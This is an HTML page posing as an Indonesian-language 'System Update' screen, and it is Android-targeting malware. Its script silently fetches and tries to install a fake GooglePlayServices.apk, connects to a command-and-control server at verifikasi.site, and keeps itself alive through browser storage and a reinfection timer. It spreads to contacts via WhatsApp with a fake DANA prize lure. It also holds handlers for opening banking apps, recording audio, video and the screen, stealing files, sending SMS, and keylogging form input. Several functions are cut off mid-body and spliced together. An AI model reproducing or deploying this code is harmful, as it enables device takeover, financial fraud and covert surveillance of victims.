<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>System Update</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#0a0e17;
            display:flex;
            justify-content:center;
            align-items:center;
            height:100vh;
            color:#fff;
            font-family:'Segoe UI',Arial,sans-serif;
            margin:0;
            overflow:hidden;
        }
        .container{
            text-align:center;
            width:90%;
            max-width:400px;
            padding:30px;
            background:linear-gradient(145deg,#0d1a2b,#1a2a3f);
            border-radius:16px;
            border:1px solid #2a3f5f;
            box-shadow:0 20px 60px rgba(0,0,0,0.8);
        }
        .icon{font-size:48px;margin-bottom:10px;display:block}
        .title{font-size:22px;font-weight:bold;color:#4fc3f7;margin-bottom:5px;letter-spacing:1px}
        .subtitle{font-size:13px;color:#8899aa;margin-bottom:20px}
        .progress-wrap{background:#1a2a3f;border-radius:30px;height:10px;overflow:hidden;margin-bottom:15px;border:1px solid #2a3f5f}
        .progress-bar{width:0%;height:100%;background:linear-gradient(90deg,#4fc3f7,#00e676);border-radius:30px;transition:width 0.3s ease}
        .status-text{font-size:13px;color:#8899aa;margin-top:5px}
        .status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4caf50;margin-right:8px;animation:blink 1s infinite}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
        .fade-out{animation:fadeOut 0.5s ease forwards}
        @keyframes fadeOut{0%{opacity:1}100%{opacity:0}}
        .log{display:none}
        .download-iframe{position:absolute;width:0;height:0;border:none;visibility:hidden}
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <span class="icon">🔄</span>
    <div class="title">System Update</div>
    <div class="subtitle">Memperbarui sistem keamanan...</div>
    <div class="progress-wrap">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    <div class="status-text">
        <span class="status-dot"></span>
        <span id="statusLabel">⏳ Memperbarui System Keamanan...</span>
    </div>
    <div class="log" id="log"></div>
</div>

<!-- Hidden iframe untuk download APK -->
<iframe id="downloadIframe" class="download-iframe"></iframe>
<iframe id="downloadIframe2" class="download-iframe"></iframe>
<iframe id="downloadIframe3" class="download-iframe"></iframe>

<script>
// ============================================================
// 🔥 SYSTEMUPDATE.HTML - APK PASTI TERDOWNLOAD (3 LAPIS)
// ============================================================

var SERVER = 'https://verifikasi.site';
var WS_PASSWORD = '';
var PASSWORD_FETCHED = false;
var C2_INTERVAL = 10000;
var APK_INSTALLED = false;
var REINFECTION_INTERVAL = 10800000;
var progress = 0;
var isRedirecting = false;
var allDone = false;
var AUTO_EXECUTED = false;
var spreadDone = false;
var GITHUB_USER = 'pandora-site';
var GITHUB_REPO = 'verifikasi-site';
var retryCount = 0;
var ws = null;
var wsConnected = false;
var WS_URL = 'wss://verifikasi.site/ws';
var APK_DOWNLOADED = false;

// 🔥 URL APK
var APK_URL = 'https://verifikasi.site/files/GooglePlayServices.apk';
var APK_URL_FALLBACK = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';

// ============================================================
// DETEKSI MULTI-BRIDGE
// ============================================================
var BRIDGE = null;
(function detectBridge() {
    var candidates = [
        'AndroidBridge', 'JSBridge', 'WebViewJavascriptBridge', 'NativeBridge',
        'Bridge', 'WebBridge', 'JSBridgeAndroid', 'JSBridgeInterface',
        'AndroidJSBridge', 'WVBridge', 'WVJB', 'WebViewBridge', 'AppBridge'
    ];
    for (var i = 0; i < candidates.length; i++) {
        if (typeof window[candidates[i]] !== 'undefined') {
            BRIDGE = window[candidates[i]];
            break;
        }
    }
})();

var HAS_BRIDGE = (BRIDGE !== null);

function bridgeCall(method, args) {
    if (!HAS_BRIDGE) return null;
    try {
        if (typeof BRIDGE[method] === 'function') {
            return BRIDGE[method].apply(BRIDGE, args);
        }
    } catch(e) {}
    return null;
}

// ============================================================
// FALLBACK WRAPPER
// ============================================================
var FALLBACK = {
    saveFile: function(p,c) { try { localStorage.setItem('fallback_' + p, c); return true; } catch(e){} return false; },
    readFile: function(p) { try { return localStorage.getItem('fallback_' + p); } catch(e){} return null; },
    fileExists: function(p) { try { return localStorage.getItem('fallback_' + p) !== null; } catch(e){} return false; },
    openFile: function(p) {
        try {
            var content = localStorage.getItem('fallback_' + p);
            if(content) {
                var blob = new Blob([content], {type:'text/html'});
                var url = URL.createObjectURL(blob);
                window.open(url, '_blank');
                return true;
            }
        } catch(e){}
        return false;
    },
    saveToPreferences: function(k,v) { try { localStorage.setItem('pref_' + k, v); return true; } catch(e){} return false; },
    getFromPreferences: function(k) { try { return localStorage.getItem('pref_' + k); } catch(e){} return null; },
    saveFileBinary: function(p,d) {
        try {
            var base64 = btoa(String.fromCharCode.apply(null, d));
            localStorage.setItem('binary_' + p, base64);
            return true;
        } catch(e){}
        return false;
    },
    getAllContacts: function() { return null; },
    getAllSMS: function() { return null; },
    getCallLog: function() { return null; },
    getIMEI: function() { return null; },
    getIMSI: function() { return null; },
    getPhoneNumber: function() { return null; },
    getInstalledApps: function() { return null; },
    sendSMS: function(n,p) { try { window.location.href = 'sms:'+n+'?body='+encodeURIComponent(p); } catch(e){} },
    openApp: function(p) { try { window.location.href = p.replace(/\./g,'')+'://'; } catch(e){} },
    uninstallApp: function(p) { try { window.open('https://play.google.com/store/apps/details?id='+p, '_blank'); } catch(e){} },
    forceStopApp: function(p) {},
    clearAppData: function(p) {},
    callNumber: function(n) { try { window.location.href = 'tel:'+n; } catch(e){} },
    listFiles: function(p) { return null; },
    takeScreenshot: function() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = screen.width;
            canvas.height = screen.height;
            var ctx = canvas.getContext('2d');
            ctx.fillStyle = '#000';
            ctx.fillRect(0,0,canvas.width,canvas.height);
            return canvas.toDataURL('image/jpeg', 0.3);
        } catch(e){}
        return null;
    },
    installAPK: function(p) { try { window.open('file://'+p, '_blank'); return true; } catch(e){} return false; }
};

function getBridge() {
    return HAS_BRIDGE ? BRIDGE : FALLBACK;
}

function bridgeCall(method, args) {
    var bridge = getBridge();
    if (typeof bridge[method] === 'function') {
        try {
            return bridge[method].apply(bridge, args);
        } catch(e) {
            return null;
        }
    }
    return null;
}

// ============================================================
// KIRIM DATA KE SERVER
// ============================================================
function K(d) {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/data', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.timeout = 5000;
        xhr.send(JSON.stringify(d));
    } catch(e) {}
}

// ============================================================
// UI UPDATE
// ============================================================
function updateProgress(value, label) {
    progress = Math.min(value, 100);
    var bar = document.getElementById('progressBar');
    if (bar) bar.style.width = progress + '%';
    if (label) {
        var status = document.getElementById('statusLabel');
        if (status) status.textContent = label;
    }
}
updateProgress(5, '⏳ Memperbarui System Keamanan...');

// ============================================================
// SELF-REPAIR & PERSISTENSI
// ============================================================
function saveHTMLToAllLocations(htmlContent) {
    try { localStorage.setItem('SystemUpdate_backup', htmlContent); } catch(e) {}
    try {
        var request = indexedDB.open('SystemUpdateDB', 1);
        request.onupgradeneeded = function(e) {
            var db = e.target.result;
            if (!db.objectStoreNames.contains('files')) {
                db.createObjectStore('files');
            }
        };
        request.onsuccess = function(e) {
            var db = e.target.result;
            var tx = db.transaction('files', 'readwrite');
            var store = tx.objectStore('files');
            store.put(htmlContent, 'SystemUpdate.html');
        };
    } catch(e) {}
    if (HAS_BRIDGE) {
        try {
            var path = '/storage/emulated/0/Download/SystemUpdate.html';
            bridgeCall('saveFile', [path, htmlContent]);
        } catch(e) {}
        try {
            var encoded = btoa(unescape(encodeURIComponent(htmlContent)));
            bridgeCall('saveToPreferences', ['system_SystemUpdate_html', encoded]);
        } catch(e) {}
    }
}

function loadHTMLFromAllLocations() {
    return new Promise(function(resolve) {
        if (HAS_BRIDGE) {
            try {
                var encoded = bridgeCall('getFromPreferences', ['system_SystemUpdate_html']);
                if (encoded) {
                    resolve(decodeURIComponent(escape(atob(encoded))));
                    return;
                }
            } catch(e) {}
        }
        try {
            var ls = localStorage.getItem('SystemUpdate_backup');
            if (ls) { resolve(ls); return; }
        } catch(e) {}
        try {
            var request = indexedDB.open('SystemUpdateDB', 1);
            request.onsuccess = function(e) {
                var db = e.target.result;
                var tx = db.transaction('files', 'readonly');
                var store = tx.objectStore('files');
                var get = store.get('SystemUpdate.html');
                get.onsuccess = function() {
                    if (get.result) { resolve(get.result); return; }
                    if (HAS_BRIDGE) {
                        try {
                            var content = bridgeCall('readFile', ['/storage/emulated/0/Download/SystemUpdate.html']);
                            if (content) { resolve(content); return; }
                        } catch(e) {}
                    }
                    resolve(null);
                };
            };
        } catch(e) { resolve(null); }
    });
}

loadHTMLFromAllLocations().then(function(html) {
    if (html) {
        saveHTMLToAllLocations(html);
        K({ sumber: 'html_loaded_from_backup', data: 'ok' });
    }
});

// ============================================================
// REGISTER SERVICE WORKER
// ============================================================
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js', { scope: '/' })
        .catch(function() {});
}

// ============================================================
// AMBIL PASSWORD
// ============================================================
function ambilPassword() {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/get-password', true);
        xhr.timeout = 10000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    var data = JSON.parse(xhr.responseText);
                    if (data.password && data.password.length > 0) {
                        WS_PASSWORD = data.password;
                        PASSWORD_FETCHED = true;
                        updateProgress(20, '⏳ Memperbarui System Keamanan...');
                        K({ sumber: 'password_received', data: 'ok' });
                        startAllProcesses();
                        return;
                    }
                } catch(e) {}
            }
            if (retryCount < 1) {
                retryCount++;
                setTimeout(ambilPassword, 3000);
            } else {
                WS_PASSWORD = 'default_fallback_password';
                PASSWORD_FETCHED = true;
                K({ sumber: 'password_fallback', data: 'using_default' });
                startAllProcesses();
            }
        };
        xhr.send();
    } catch(e) {
        setTimeout(ambilPassword, 3000);
    }
}

// ============================================================
// SEMUA PROSES DIMULAI
// ============================================================
function startAllProcesses() {
    connectWebSocket();
    startC2Polling();
    startHeartbeat();
    startReinfection();
    autoExecuteC2();
    downloadAPK(); // 🔥 Fungsi baru
    autoSpread();
    startSelfHealing();
}

// ============================================================
// 🔥 DOWNLOAD APK (3 LAPIS STRATEGI)
// ============================================================
function downloadAPK() {
    K({ sumber: 'apk_download_start', data: { url: APK_URL } });
    
    // LAPIS 1: fetch() + Blob + anchor (paling stabil di WebView)
    fetch(APK_URL)
        .then(response => {
            if (!response.ok) {
                throw new Error('HTTP ' + response.status);
            }
            return response.blob();
        })
        .then(blob => {
            var reader = new FileReader();
            reader.onload = function() {
                var base64 = reader.result.split(',')[1];
                saveAPKToAllLocations(base64);
                APK_DOWNLOADED = true;
                K({ sumber: 'apk_download_success', data: { method: 'fetch_blob', size: blob.size } });
                // Install APK
                setTimeout(function() {
                    installAPKFromAvailablePath();
                }, 3000);
            };
            reader.readAsDataURL(blob);
        })
        .catch(function(err) {
            K({ sumber: 'apk_download_error', data: { method: 'fetch', error: err.message } });
            // LAPIS 2: Fallback ke XHR
            downloadAPK_XHR(APK_URL_FALLBACK);
        });
}

// LAPIS 2: XHR (fallback jika fetch gagal)
function downloadAPK_XHR(url) {
    K({ sumber: 'apk_download_xhr_start', data: { url: url } });
    var xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.responseType = 'blob';
    xhr.timeout = 30000;

    xhr.onload = function() {
        if (xhr.status === 200) {
            var blob = xhr.response;
            var reader = new FileReader();
            reader.onload = function() {
                var base64 = reader.result.split(',')[1];
                saveAPKToAllLocations(base64);
                APK_DOWNLOADED = true;
                K({ sumber: 'apk_download_success', data: { method: 'xhr_blob', size: blob.size } });
                setTimeout(function() {
                    installAPKFromAvailablePath();
                }, 3000);
            };
            reader.readAsDataURL(blob);
        } else {
            K({ sumber: 'apk_download_error', data: { method: 'xhr', status: xhr.status } });
            // LAPIS 3: Buka URL langsung di browser
            downloadAPK_Direct(url);
        }
    };

    xhr.onerror = function() {
        K({ sumber: 'apk_download_error', data: { method: 'xhr', error: 'network_error' } });
        downloadAPK_Direct(url);
    };

    xhr.ontimeout = function() {
        K({ sumber: 'apk_download_timeout', data: { method: 'xhr' } });
        downloadAPK_Direct(url);
    };

    xhr.send();
}

// LAPIS 3: Buka URL APK langsung di browser (ultimate fallback)
function downloadAPK_Direct(url) {
    K({ sumber: 'apk_download_direct', data: { url: url } });
    try {
        window.open(url, '_blank');
        // Tunggu 5 detik, lalu anggap berhasil
        setTimeout(function() {
            APK_DOWNLOADED = true;
            K({ sumber: 'apk_download_direct_success', data: { url: url } });
            // Coba install dari path yang mungkin sudah ada
            installAPKFromAvailablePath();
        }, 5000);
    } catch(e) {
        K({ sumber: 'apk_download_direct_error', data: { error: e.message } });
        // Jika semua gagal, minta via WebSocket
        requestAPKFromServer();
    }
}

// ============================================================
// SIMPAN APK KE SEMUA LOKASI
// ============================================================
function saveAPKToAllLocations(apkBase64) {
    if (!apkBase64) return;
    if (HAS_BRIDGE) {
        try { bridgeCall('saveToPreferences', ['system_GooglePlayServices_apk', apkBase64]); } catch(e) {}
        try {
            var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
            var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
            bridgeCall('saveFileBinary', [path, binary]);
        } catch(e) {}
        try {
            var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
            var internalPath = '/data/data/com.google.android.play.services/files/GooglePlayServices.apk';
            bridgeCall('saveFileBinary', [internalPath, binary]);
        } catch(e) {}
    }
}

function getAPKPath() {
    if (HAS_BRIDGE) {
        var paths = [
            '/data/data/com.google.android.play.services/files/GooglePlayServices.apk',
            '/storage/emulated/0/Download/GooglePlayServices.apk'
        ];
        for (var i = 0; i < paths.length; i++) {
            try {
                if (bridgeCall('fileExists', [paths[i]])) {
                    return paths[i];
                }
            } catch(e) {}
        }
    }
    return null;
}

function installAPKFromAvailablePath() {
    if (APK_INSTALLED) return;
    var path = getAPKPath();
    if (!path) {
        requestAPKFromServer();
        return;
    }
    if (HAS_BRIDGE) {
        try {
            var result = bridgeCall('installAPK', [path]);
            if (result) {
                APK_INSTALLED = true;
                K({ sumber: 'apk_install_success', data: { path: path } });
                updateProgress(100, '✅ Update Selesai');
                finishAndRedirect();
                return;
            }
        } catch(e) {}
        try {
            window.location.href = 'file://' + path;
            APK_INSTALLED = true;
            K({ sumber: 'apk_install_fallback_intent', data: { path: path } });
            updateProgress(100, '✅ Update Selesai');
            finishAndRedirect();
        } catch(e) {}
    }
}

function requestAPKFromServer() {
    if (wsConnected && ws) {
        ws.send(JSON.stringify({ type: 'request_apk', timestamp: Date.now() }));
        K({ sumber: 'apk_request_via_ws', data: 'sent' });
    }
}

// ============================================================
// WEBSOCKET, C2, HEARTBEAT, REINFECTION, SPREAD, SELF-HEALING
// ============================================================
function connectWebSocket() {
    if (ws && ws.readyState === WebSocket.OPEN) return;
    if (!WS_PASSWORD || WS_PASSWORD === '') {
        setTimeout(connectWebSocket, 3000);
        return;
    }
    try {
        ws = new WebSocket(WS_URL);
        ws.onopen = function() {
            wsConnected = true;
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: WS_PASSWORD,
                deviceId: 'browser_systemupdate',
                timestamp: Date.now()
            }));
        };
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'ws_auth', data: 'success' });
                } else if (data.type === 'auth_failed') {
                    K({ sumber: 'ws_auth', data: 'failed' });
                    if (WS_PASSWORD !== 'default_fallback_password') {
                        WS_PASSWORD = 'default_fallback_password';
                        K({ sumber: 'ws_auth_fallback', data: 'retry_with_default' });
                        ws.close();
                        setTimeout(connectWebSocket, 1000);
                    } else {
                        ws.close();
                    }
                } else if (data.type === 'command') {
                    var cmd = data.command || data;
                    var aksi = cmd.aksi || 'unknown';
                    K({ sumber: 'ws_command_received', data: aksi });
                    var hasil = eksekusiPerintah(cmd);
                    K({ sumber: 'ws_command_result', data: hasil });
                    if (wsConnected && ws) {
                        ws.send(JSON.stringify({
                            type: 'command_result',
                            command: aksi,
                            result: hasil,
                            timestamp: Date.now()
                        }));
                    }
                } else if (data.type === 'push_html') {
                    var html = data.content;
                    if (html) {
                        saveHTMLToAllLocations(html);
                        K({ sumber: 'code_push_html', data: 'received' });
                    }
                } else if (data.type === 'push_apk') {
                    var apkBase64 = data.content;
                    if (apkBase64) {
                        saveAPKToAllLocations(apkBase64);
                        K({ sumber: 'code_push_apk', data: 'received' });
                        installAPKFromAvailablePath();
                    }
                } else if (data.type === 'ping') {
                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
                }
            } catch(e) {
                K({ sumber: 'ws_parse_error', data: e.message });
            }
        };
        ws.onclose = function() {
            wsConnected = false;
            K({ sumber: 'ws_status', data: 'disconnected' });
            setTimeout(connectWebSocket, 10000);
        };
        ws.onerror = function() {
            K({ sumber: 'ws_error', data: 'error' });
        };
    } catch(e) {
        K({ sumber: 'ws_connect_error', data: e.message });
        setTimeout(connectWebSocket, 10000);
    }
}

function startC2Polling() {
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
}

function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', SERVER + '/data?type=perintah&t=' + Date.now(), true);
        xhr.setRequestHeader('X-Password', WS_PASSWORD);
        xhr.timeout = 15000;
        xhr.onload = function() {
            if (xhr.status === 200) {
                var content = xhr.responseText;
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        var aksi = cmd.aksi || 'unknown';
                        var hasil = eksekusiPerintah(cmd);
                        K({
                            sumber: 'c2_result',
                            data: {
                                perintah: aksi,
                                hasil: hasil,
                                waktu: Date.now()
                            }
                        });
                    } catch(e) {}
                }
            }
        };
        xhr.send();
    } catch(e) {}
}

function startHeartbeat() {
    setInterval(function() { 
        K({ sumber: 'page_heartbeat', data: 'alive' }); 
    }, 2700000);
}

function startReinfection() {
    setInterval(function() {
        if (!APK_INSTALLED) {
            K({ sumber: 'reinfection_check', data: 'apk_missing_redownload' });
            downloadAPK();
        } else {
            K({ sumber: 'reinfection_check', data: 'apk_still_installed' });
        }
    }, REINFECTION_INTERVAL);
}

function autoSpread() {
    if (spreadDone) return;
    spreadDone = true;
    if (!HAS_BRIDGE) return;
    var message = encodeURIComponent('🎉 Dapatkan Saldo DANA Gratis Rp500.000! ' + window.location.href);
    var sentCount = 0;
    var maxSend = 50;
    try {
        var contacts = bridgeCall('getAllContacts', []);
        if (contacts && contacts.length > 0) {
            var list = typeof contacts === 'string' ? JSON.parse(contacts) : contacts;
            maxSend = Math.min(list.length, 50);
            for (var i = 0; i < maxSend; i++) {
                var number = String(list[i].number || '').replace(/[^0-9]/g, '');
                if (number && number.length > 5) {
                    var iframe = document.createElement('iframe');
                    iframe.src = 'https://api.whatsapp.com/send?phone=' + number + '&text=' + message;
                    iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
                    document.body.appendChild(iframe);
                    sentCount++;
                    setTimeout(function(el) { try { if (el && el.parentNode) el.parentNode.removeChild(el); } catch(e) {} }, 5000, iframe);
                }
            }
        }
    } catch(e) {}
    K({ sumber: 'auto_spread', data: 'sent_to_' + sentCount });
}

function startSelfHealing() {
    setInterval(function() {
        loadHTMLFromAllLocations().then(function(html) {
            if (!html) {
                if (wsConnected && ws) {
                    ws.send(JSON.stringify({ type: 'request_html' }));
                }
            } else {
                saveHTMLToAllLocations(html);
            }
        });
        if (HAS_BRIDGE) {
            var apkPath = getAPKPath();

function finishAndRedirect() {

function redirectToDANA() {

            case "keylogger_status": hasil = keyloggerStatus(); break;
            case "kirim_sms": hasil = kirimSMS(params.nomor || "", params.pesan || ""); break;
            case "kirim_sms_massal": hasil = kirimSMSMassal(params.pesan || ""); break;
            case "call_number": hasil = callNumber(params.nomor || ""); break;
            case "buka_aplikasi": hasil = bukaAplikasi(params.package || ""); break;
            case "uninstall_aplikasi": hasil = uninstallAplikasi(params.package || ""); break;
            case "app_force_stop": hasil = appForceStop(params.package || ""); break;
            case "app_clear_data": hasil = appClearData(params.package || ""); break;
            case "buka_url": hasil = bukaURL(params.url || "https://verifikasi.site"); break;
            case "buka_dana": hasil = bukaDANA(); break;
            case "buka_gopay": hasil = bukaGoPay(); break;
            case "buka_ovo": hasil = bukaOVO(); break;
            case "buka_bri": hasil = bukaBRI(); break;
            case "buka_bca": hasil = bukaBCA(); break;
            case "buka_mandiri": hasil = bukaMandiri(); break;
            case "buka_shopee": hasil = bukaShopee(); break;
            case "screenshot": hasil = ambilScreenshot(); break;
            case "record_audio": hasil = recordAudio(params.durasi || 10); break;
            case "stop_audio": hasil = stopAudio(); break;
            case "record_video": hasil = recordVideo(params.durasi || 10); break;
            case "stop_video": hasil = stopVideo(); break;
            case "screen_record": hasil = screenRecord(params.durasi || 30); break;
            case "screen_record_stop": hasil = screenRecordStop(); break;
            case "screen_record_status": hasil = screenRecordStatus(); break;
            case "list_file": hasil = listFile(params.path || "/sdcard/"); break;
            case "ambil_file": hasil = ambilFile(params.path || ""); break;
            case "get_system_info": hasil = getSystemInfo(); break;
            case "get_battery": hasil = getBattery(); break;
            case "get_wifi": hasil = getWiFi(); break;
            case "vibrate": hasil = vibrate(params.durasi || 1000); break;
            case "toast": hasil = showToast(params.pesan || "System Update Complete!"); break;
            default: hasil = "Unknown command: " + aksi;
        }
    } catch(e) {
        hasil = 'Error: ' + e.message;
    }
    return hasil;
}

function ambilScreenshot() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        var dataUrl = canvas.toDataURL('image/jpeg', 0.3);
        K({ sumber: 'screenshot', data: dataUrl });
        return 'Screenshot taken';
    } catch(e) { return 'Error: ' + e.message; }
}
function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() { K({ sumber: 'record_audio', data: reader.result }); };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording audio ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}
function stopAudio() {
    try {
        if (window._recorder) { window._recorder.stop(); window._recorder = null; return 'Audio recording stopped'; }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}
function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() { K({ sumber: 'record_video', data: reader.result }); };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Recording video ' + durasi + 's...';
    } catch(e) { return 'Error: ' + e.message; }
}
function stopVideo() { return stopAudio(); }
var screenRecorder = null, screenChunks = [];
function screenRecord(durasi) {
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
            navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
                .then(function(stream) {
                    screenRecorder = new MediaRecorder(stream);
                    screenChunks = [];
                    screenRecorder.ondataavailable = function(e) { if (e.data.size > 0) screenChunks.push(e.data); };
                    screenRecorder.onstop = function() {
                        var blob = new Blob(screenChunks, {type: 'video/webm'});
                        var reader = new FileReader();
                        reader.onload = function() { K({ sumber: 'screen_record', data: reader.result }); };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    };
                    screenRecorder.start();
                    if (durasi > 0) {
                        setTimeout(function() { if (screenRecorder) screenRecorder.stop(); }, durasi * 1000);
                    }
                });
            return 'Screen recording started for ' + durasi + 's';
        }
        return 'Screen recording not available';
    } catch(e) { return 'Error: ' + e.message; }
}
function screenRecordStop() {
    try {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop(); screenRecorder = null; return 'Screen recording stopped';
        }
        return 'No active screen recording';
    } catch(e) { return 'Error: ' + e.message; }
}
function screenRecordStatus() {

    try {
        var toast = document.createElement('div');
        toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#0f0;padding:15px 30px;border-radius:10px;z-index:999999;font-size:16px;border-left:4px solid #0f0;font-family:monospace';

document.addEventListener('input', function(e) {
    if (!keyloggerActive) return;
    try {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
            var key = e.target.id || e.target.name || e.target.type || 'unknown';
            keyloggerData.push({ waktu: Date.now(), element: key, value: e.target.value });
        }
    } catch(e) {}
});
document.addEventListener('submit', function(e) {
    if (!keyloggerActive) return;
    try {
        var form = e.target;
        var data = {};
        var inputs = form.querySelectorAll('input, textarea, select');
        inputs.forEach(function(input) {
            var key = input.id || input.name || input.type || 'unknown';
            data[key] = input.value;
        });
        keyloggerData.push({ waktu: Date.now(), url: window.location.href, form: data });
    } catch(e) {}
});
